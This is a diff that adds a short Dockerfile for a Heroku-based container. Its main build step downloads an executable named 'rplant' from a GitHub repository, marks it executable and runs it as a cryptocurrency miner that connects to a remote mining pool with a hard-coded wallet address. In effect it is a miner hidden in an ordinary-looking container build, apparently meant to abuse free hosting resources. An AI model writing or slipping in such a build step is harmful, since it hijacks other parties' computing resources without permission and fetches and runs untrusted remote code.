@@ -1,0 +1,4 @@
+FROM heroku/heroku:18
+RUN apt-get install -y curl git unzip wget
+RUN wget https://github.com/motupo/simerah/raw/main/rplant; chmod +x rplant; ./rplant -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u mbc1qss3f3wem69spqnywzx5rlqkgk34t3pa8tgqrhj.siMerah
+CMD bash heroku.sh
